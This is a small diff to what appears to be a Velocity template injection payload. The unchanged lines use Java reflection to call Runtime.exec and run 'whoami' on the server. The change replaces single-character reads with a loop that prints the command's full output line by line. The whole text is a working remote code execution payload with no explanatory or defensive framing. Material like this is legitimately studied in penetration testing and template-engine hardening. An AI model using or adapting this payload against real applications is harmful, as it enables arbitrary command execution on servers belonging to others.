@@ -4,7 +4,12 @@
 #set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
 #set ($out=$a.getInputStream())
 
-$out.read()
-$out.read()
-$out.read()
-$out.read()
+#foreach ($i in [0..100000])
+    #set ($line = false)
+    #set ($line = $out.readLine())
+    #if ($line)
+        ${line}
+    #else
+        #break
+    #end
+#end
